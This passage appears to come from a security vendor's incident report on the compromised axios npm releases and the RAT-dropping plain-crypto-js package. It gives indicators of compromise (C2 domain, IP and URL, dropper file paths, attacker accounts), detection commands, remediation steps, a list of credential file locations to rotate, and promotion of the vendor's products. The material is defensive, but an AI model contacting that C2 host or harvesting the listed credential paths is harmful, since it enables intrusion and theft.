             Dropper overwrites package.json with clean stub from package.md.
             Contains: version 4.2.0 manifest, no scripts, no postinstall.
```

‍

The 36-second gap between the two writes is the execution time of the dropper — it wrote the second file only after successfully launching the background payload. Harden-Runner flagged this as a **“Source Code Overwritten”** file integrity event. Post-infection, any tool that reads `node_modules/plain-crypto-js/package.json` will see the clean manifest. The write event log is the only runtime artifact that proves the swap occurred.

Indicators of Compromise
------------------------

**Malicious npm Packages**

* axios@1.14.1 · shasum: 2553649f2322049666871cea80a5d0d6adc700ca
* axios@0.30.4 · shasum: d6f3f62fd3b9f5432f5782b62d8cfd5247d5ee71
* plain-crypto-js@4.2.1 · shasum: 07d889e2dadce6f3910dcbc253317d28ca61c766

**Network Indicators**

* C2 domain · sfrclak.com
* C2 IP · 142.11.206.73
* C2 URL · http://sfrclak.com:8000/6202033
* C2 POST body (macOS) · packages.npm.org/product0
* C2 POST body (Windows) · packages.npm.org/product1
* C2 POST body (Linux) · packages.npm.org/product2

**File System Indicators**

* macOS · /Library/Caches/com.apple.act.mond
* Windows (persistent) · %PROGRAMDATA%\wt.exe
* Windows (temp, self-deletes) · %TEMP%\6202033.vbs
* Windows (temp, self-deletes) · %TEMP%\6202033.ps1
* Linux · /tmp/ld.py

**Attacker-Controlled Accounts**

* jasonsaayman · compromised legitimate axios maintainer, email changed to [ifstap@proton.me](mailto:ifstap@proton.me)
* nrwise · attacker-created account, [nrwise@proton.me](mailto:nrwise@proton.me), published plain-crypto-js

**Safe Version Reference**

* axios@1.14.0 (safe) · shasum: 7c29f4cf2ea91ef05018d5aa5399bf23ed3120eb

Am I Affected?
--------------

To determine whether your organization was impacted, check across three surfaces: your code repositories, your CI/CD pipelines, and your developer machines. The malicious versions were live for under 3 hours, but a single `npm install` during that window is enough to trigger the RAT dropper.

### Code Repositories

Search your GitHub repositories for any reference to the compromised axios versions in `package.json` or `package-lock.json` files. You can use GitHub code search to scan across your entire organization:

**Note:** GitHub code search matches the package name and version as two separate strings, not as an exact combined match. This means results may include false positives where the file mentions "axios" and "1.14.1" independently (for example, in changelog entries, documentation, or comments) without the project actually depending on the compromised version. Filter your results to confirm that matches are in actual `package.json` or `package-lock.json` dependency entries before taking action.

You can also check locally in any repository:

```
npm list axios 2>/dev/null | grep -E "1\.14\.1|0\.30\.4"
grep -A1 '"axios"' package-lock.json | grep -E "1\.14\.1|0\.30\.4"
```

`‍`And check for the `plain-crypto-js` directory in `node_modules`:

```
ls node_modules/plain-crypto-js 2>/dev/null && echo "POTENTIALLY AFFECTED"
```

If `setup.js` already ran, `package.json` inside this directory will have been replaced with a clean stub reporting version 4.2.0. The presence of the directory alone is sufficient evidence the dropper executed. `plain-crypto-js` is not a dependency of any legitimate axios version.

### CI/CD Pipelines

Review your CI/CD pipeline logs for any `npm install` executions that may have pulled `axios@1.14.1` or `axios@0.30.4` during the window the malicious versions were live (approximately 2026-03-31 00:21 UTC to 03:15 UTC). Search for:

* **Install logs** - look for `axios@1.14.1`, `axios@0.30.4`, or `plain-crypto-js` in your `npm install` / `npm ci` output
* **Network egress traffic** - if you have network monitoring on your CI runners, look for outbound connections to `sfrclak.com` or `142.11.206.73` on port 8000

Any pipeline that installed either malicious version should be treated as compromised. If you use persistent (self-hosted) CI runners, follow the developer machine remediation steps below. If you use ephemeral runners (e.g., GitHub-hosted runners), the runner itself is destroyed after each job, but any secrets or credentials injected into the workflow during the compromised run should be rotated immediately.

### Developer Machines

Developer machines are often the most overlooked attack surface in a supply chain incident. Any developer who ran `npm install` with the compromised axios version on their local machine is a potential point of compromise.

**Step 1 - Check for the malicious npm package.** Search your entire home directory recursively for any `node_modules` folder containing `plain-crypto-js` or the compromised axios versions:

```
# Recursively search for plain-crypto-js across all projects under your home directory
find ~ -type d -name "plain-crypto-js" -path "*/node_modules/*" 2>/dev/null

# Recursively search for compromised axios versions in all package-lock.json files
find ~ -name "package-lock.json" -exec grep -l "axios.*1\.14\.1\|axios.*0\.30\.4" {} \; 2>/dev/null

# Check npm global packages
npm list -g axios 2>/dev/null | grep -E "1\.14\.1|0\.30\.4"
```

You can also use [StepSecurity Dev Machine Guard](https://github.com/step-security/dev-machine-guard) (free for community users) to scan all installed npm packages on your machine and identify the compromised versions automatically:

```
cat stepsecurity-dev-machine-guard.sh
curl -sSL https://github.com/step-security/dev-machine-guard/releases/download/v1.8.2/stepsecurity-dev-machine-guard.sh -o stepsecurity-dev-machine-guard.sh
echo "37516a0a420b21ef3b68129f8d089be706974a597a821ec83e598cd180716f60  stepsecurity-dev-machine-guard.sh" | shasum -a 256 --check --status
if [ $? -eq 0 ]; then
  bash stepsecurity-dev-machine-guard.sh --enable-npm-scan
else
  echo "Checksum verification failed! The file may have been tampered with."
  rm -f stepsecurity-dev-machine-guard.sh
  exit 1
fi

bash stepsecurity-dev-machine-guard.sh
  StepSecurity Dev Machine Guard v1.8.2

  ✓ Gathering device information (0s)
  ✓ Scanning IDEs & desktop apps (4s)
  ✓ Scanning AI agents & CLI tools (19s)
  ✓ Scanning MCP server configs (0s)
  ✓ Scanning IDE extensions (0s)
  ✓ Detecting Node.js package managers (0s)
  ✓ Scanning global packages (1s)
  ✓ Scanning Node.js projects (70s)

  Scan completed in 94s

  ...

  NODE.JS PROJECTS                   12 found

  NODE.JS PACKAGES

    /user/acme-user/console (npm)
      @agentclientprotocol/sdk@0.15.0
      @anthropic-ai/sdk@0.73.0
      @aws-crypto/sha256-browser@5.2.0
      @aws-crypto/sha256-js@5.2.0
      @aws-crypto/supports-web-crypto@5.2.0
      @aws-crypto/util@5.2.0
  ...
```

**Step 2 - Check for RAT artifacts using your EDR solution.** The dropper creates platform-specific files. Use your EDR (CrowdStrike, SentinelOne, Microsoft Defender for Endpoint, etc.) to search for the following file system indicators across enrolled devices:

```
# macOS
/Library/Caches/com.apple.act.mond

# Windows (persistent, survives reinstalls)
%PROGRAMDATA%\wt.exe

# Linux
/tmp/ld.py
You can also check manually:

# macOS
ls -la /Library/Caches/com.apple.act.mond 2>/dev/null && echo "COMPROMISED"

# Linux
ls -la /tmp/ld.py 2>/dev/null && echo "COMPROMISED"

# Windows (cmd.exe)
dir "%PROGRAMDATA%\wt.exe" 2>nul && echo COMPROMISED
```

`‍`**Step 3 - Check network logs for C2 communication.** If you have a corporate proxy, firewall, DNS filtering solution, or if your EDR collects outbound network telemetry, search for connections to:

* Domain: `sfrclak.com`
* IP: `142.11.206.73`
* Port: `8000`

Any outbound connection to these indicators from a developer machine or CI runner confirms that the RAT dropper successfully executed and contacted the attacker's command-and-control server.

For the Community: Recovery Steps
---------------------------------

If you have confirmed that you are affected, follow these recovery steps organized by the surface where the compromise was found. The overarching principle is: **if you found evidence of the malicious package or RAT artifacts, assume the affected system is compromised and act accordingly.**

### Code Repositories

If found in a pull request: Close the pull request immediately. Do not merge it. However, note that if the PR triggered a CI/CD pipeline run, the malicious `postinstall` hook may have already executed on the runner. See the CI/CD recovery steps below.

If found in the default branch: Remove the compromised version and downgrade to a known-safe release:

```
npm install axios@1.14.0   # for 1.x users
npm install axios@0.30.3   # for 0.x users
```

`‍`Add an `overrides` block to your `package.json` to prevent transitive resolution back to the malicious versions:

```
{
  "dependencies": { "axios": "1.14.0" },
  "overrides":    { "axios": "1.14.0" },
  "resolutions":  { "axios": "1.14.0" }
}
```

`‍`Remove `plain-crypto-js` from `node_modules` and reinstall cleanly:

```
rm -rf node_modules/plain-crypto-js
npm install --ignore-scripts
```

### CI/CD Pipelines

**If you use persistent (self-hosted) runners:** Treat the runner as a compromised developer machine. Follow the developer machine recovery steps below: isolate the machine, inventory credentials, reformat it, and rebuild from a known-good state.

**If you use ephemeral runners (e.g., GitHub-hosted runners):** The runner environment itself is destroyed after each job. However, any secrets or credentials that were available to the workflow during the compromised run should be considered compromised. Rotate all injected secrets immediately, including:

* npm tokens
* AWS access keys and session tokens
* SSH private keys
* Cloud credentials (GCP, Azure, etc.)
* CI/CD secrets (GitHub Actions secrets, environment variables)
* Any values present in `.env` files accessible at install time

As a standing policy, use `--ignore-scripts` in CI/CD to prevent `postinstall` hooks from running during automated builds:

```
npm ci --ignore-scripts
```

### Developer Machines

If you found the malicious package or any RAT artifact on a developer machine, assume it is fully compromised. Do not attempt to clean it in place.

1. Isolate the machine from the network immediately. Disconnect from Wi-Fi, unplug Ethernet, and disable any VPN connections to prevent further data exfiltration or lateral movement.

2. Inventory all secrets and credentials on the machine before reformatting. You need a complete list so you can rotate everything after the wipe. Common credentials to inventory include:

* npm tokens (`~/.npmrc`)
* SSH private keys (`~/.ssh/`)
* AWS credentials (`~/.aws/credentials`, `~/.aws/config`)
* GCP service account keys and application default credentials
* Azure CLI tokens
* Git credentials and personal access tokens (GitHub, GitLab, Bitbucket)
* Docker registry credentials (`~/.docker/config.json`)
* Kubernetes configs (`~/.kube/config`)
* API keys and secrets in local `.env` files across projects
* Browser-stored passwords and session cookies
* Database connection strings
* Any secrets stored in local password managers or keychains

3. Reformat the machine and rebuild from a known-good state.

4. Rotate every credential identified in step 2. Do this from a separate, known-clean machine. Review access logs for any services the developer had authenticated to, looking for anomalous activity during and after the compromise window.

### Block C2 Traffic

As a precautionary measure across all environments (developer machines, CI runners, and corporate networks), block outbound traffic to the attacker's command-and-control infrastructure:

```
# Block via firewall (Linux)
iptables -A OUTPUT -d 142.11.206.73 -j DROP

# Block via /etc/hosts (macOS/Linux)
echo "0.0.0.0 sfrclak.com" >> /etc/hosts
```

`‍`If you have DNS filtering or a corporate proxy, add `sfrclak.com` and `142.11.206.73` to your blocklist.

### Defense in Depth: Cooldown and Version Age Policies

Most malicious npm packages are identified and removed within hours of publication. Configuring cooldown periods and minimum version age policies across your tooling creates a safety buffer that prevents automatic adoption of newly published (and potentially compromised) packages. In this case, `plain-crypto-js@4.2.1` was published just hours before the compromised axios versions. Any of the following policies would have prevented automatic adoption.

**Dependabot cooldown checks:** Configure [Dependabot version updates](https://docs.github.com/en/code-security/dependabot/dependabot-version-updates/configuration-options-for-the-dependabot.yml-file) with a cooldown period so that Dependabot delays raising PRs for newly published versions:

```
# .github/dependabot.yml
version: 2
updates:
  - package-ecosystem: "npm"
    directory: "/"
    schedule:
      interval: "weekly"
    cooldown:
      default: 3
      # Dependabot will wait 3 days after a version is published
      # before opening a PR to update to it
```

`‍`**npm (v11.10.0+):** Configure npm to refuse to install packages published within a specified window. Add to your `.npmrc` (per-project or global):

```
# ~/.npmrc or project-level .npmrc
min-release-age=7d
```

`‍`**pnpm (v10.16+):** pnpm supports `minimumReleaseAge` in `.npmrc`, covering both direct and transitive dependencies. You can also exclude specific trusted packages from the cooldown:

```
# .npmrc (pnpm)
minimum-release-age=7d
minimum-release-age-exclude=esbuild,turbo
```

‍**Yarn (v4.10+):** Yarn uses `npmMinimalAgeGate` in `.yarnrc.yml`. The value is specified in minutes or as a duration string. You can exempt specific packages using `npmPreapprovedPackages`:

```
# .yarnrc.yml
npmMinimalAgeGate: "7d"
npmPreapprovedPackages:
  - "@yourorg/*"
```

`‍`**Bun (v1.3+):** Bun supports `minimumReleaseAge` in `bunfig.toml`:

```
# bunfig.toml
[install]
minimumReleaseAge = 604800
```

All major Node.js package managers now support some form of release-age gating. These policies are not a silver bullet on their own, but as part of a defense-in-depth strategy they significantly reduce the window during which a newly published malicious package can be automatically pulled into your projects.

For StepSecurity Enterprise Customers
-------------------------------------

### Threat Center Alert

StepSecurity has published a threat intel alert in the Threat Center with all relevant links to check if your organization is affected. The alert includes the full attack summary, technical analysis, IOCs, affected versions, and remediation steps, so teams have everything needed to triage and respond immediately. Threat Center alerts are delivered directly into existing SIEM workflows for real-time visibility.

### Harden-Runner

[Harden-Runner](https://docs.stepsecurity.io/harden-runner) is a purpose-built security agent for CI/CD runners.

It enforces a network egress allowlist in GitHub Actions, restricting outbound network traffic to only allowed endpoints. Both DNS and network-level enforcement prevent covert data exfiltration. The C2 callback to `sfrclak.com:8000` and the payload fetch in the `postinstall` script would have been blocked at the network level before the RAT could be delivered.

Harden-Runner also automatically logs outbound network traffic per job and repository, establishing normal behavior patterns and flagging anomalies. This reveals whether malicious `postinstall` scripts executed exfiltration attempts or contacted suspicious domains, even when the malware self-deletes its own evidence afterward. The C2 callback to `sfrclak.com:8000` was flagged as anomalous because it had never appeared in any prior workflow run.

### Detect Compromised Developer Machines

Supply chain attacks like this one do not stop at the CI/CD pipeline. The malicious `postinstall` script in `plain-crypto-js@4.2.1` drops a cross-platform RAT designed to run on the developer's own machine, harvesting credentials, SSH keys, cloud tokens, and other secrets from the local environment. Every developer who ran `npm install` with the compromised axios version outside of CI is a potential point of compromise.

[StepSecurity Dev Machine Guard](https://docs.stepsecurity.io/developer-mdm) gives security teams real-time visibility into npm packages installed across every enrolled developer device. When a malicious package is identified, teams can immediately search by package name and version to discover all impacted machines, as shown below with `axios@1.14.1` and `axios@0.30.4`.

### npm Package Cooldown Check

Newly published npm packages are temporarily blocked during a configurable cooldown window. When a PR introduces or updates to a recently published version, the check automatically fails. Since most malicious packages are identified within 24 hours, this creates a crucial safety buffer. In this case, `plain-crypto-js@4.2.1` was published hours before the axios releases, so any PR updating to `axios@1.14.1` or `axios@0.30.4` during the cooldown period would have been blocked automatically.

### npm Package Compromised Updates Check

StepSecurity maintains a real-time database of known malicious and high-risk npm packages, updated continuously, often before official CVEs are filed. If a PR attempts to introduce a compromised package, the check fails and the merge is blocked. Both `axios@1.14.1` and `plain-crypto-js@4.2.1` were added to this database within minutes of detection.

### npm Package Search

Search across all PRs in all repositories across your organization to find where a specific package was introduced. When a compromised package is discovered, instantly understand the blast radius: which repos, which PRs, and which teams are affected. This works across pull requests, default branches, and dev machines.

### AI Package Analyst

[AI Package Analyst](https://app.stepsecurity.io/oss-security-feed/axios?version=0.30.4) continuously monitors the npm registry for suspicious releases in real time, scoring packages for supply chain risk before you install them. In this case, both `axios@1.14.1` and `plain-crypto-js@4.2.1` were flagged within minutes of publication, giving teams time to investigate, confirm malicious intent, and act before the packages accumulated significant installs. Alerts include the full behavioral analysis, decoded payload details, and direct links to the OSS Security Feed.

Acknowledgements
----------------

We want to thank the axios maintainers and the community members who quickly identified and triaged the compromise in [GitHub issue #10604](https://github.com/axios/axios/issues/10604). Their rapid response, collaborative analysis, and clear communication helped the ecosystem understand the threat and take action within hours.

We also want to thank GitHub for swiftly suspending the compromised account and npm for quickly unpublishing the malicious axios versions and placing a security hold on `plain-crypto-js`. The coordinated response across maintainers, GitHub, and npm significantly limited the window of exposure for developers worldwide.